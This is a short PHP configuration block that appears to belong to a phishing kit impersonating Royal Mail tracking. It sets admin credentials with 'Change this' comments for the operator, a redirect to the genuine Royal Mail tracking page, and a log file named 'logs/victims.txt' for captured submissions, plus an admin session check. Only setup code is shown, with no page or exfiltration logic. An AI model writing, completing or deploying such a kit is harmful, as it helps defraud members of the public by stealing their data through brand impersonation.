<?php
// === CONFIGURATION ===
$admin_username = "admin";           // Change this
$admin_password = "RoyalMail2025!";  // Change this (strong password)
$forward_url = "https://www.royalmail.com/track-your-item";
$log_file = "logs/victims.txt";

if (!is_dir("logs")) mkdir("logs", 0755, true);

// Simple auth check for admin
function is_logged_in() {
    return isset($_SESSION['authenticated']) && $_SESSION['authenticated'] === true;
}

session_start();
?>